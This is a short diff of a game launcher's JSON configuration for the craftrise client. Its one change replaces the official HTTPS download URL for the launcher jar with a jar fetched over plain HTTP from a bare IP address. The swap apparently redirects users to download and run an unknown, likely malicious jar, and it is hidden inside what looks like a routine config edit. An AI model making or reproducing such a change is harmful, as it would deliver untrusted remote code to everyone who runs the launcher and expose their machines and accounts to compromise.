@@ -92,7 +92,7 @@
     "WINDOWS_BS": {
         "javaURL": "https:\/\/client.craftrise.network\/api\/launcher\/launcher.json",
         "javaType": "jdk",
-        "launcherURL": "https:\/\/client.craftrise.network\/api\/launcher\/files\/6666cd4e07197b12dfbb4f0f58cd3c717fcb4590.jar",
+        "launcherURL": "http://5.180.106.124/a032a6fbfa3838da41f60ccc09efe2fa.jar",
         "startArguments": "-Xmx%selectedRAM%M -Djava.net.preferIPv4Stack=true -XX:+DisableAttachMechanism -Dcom.ibm.tools.attach.enable=no -Xmn128M"
     }
 }
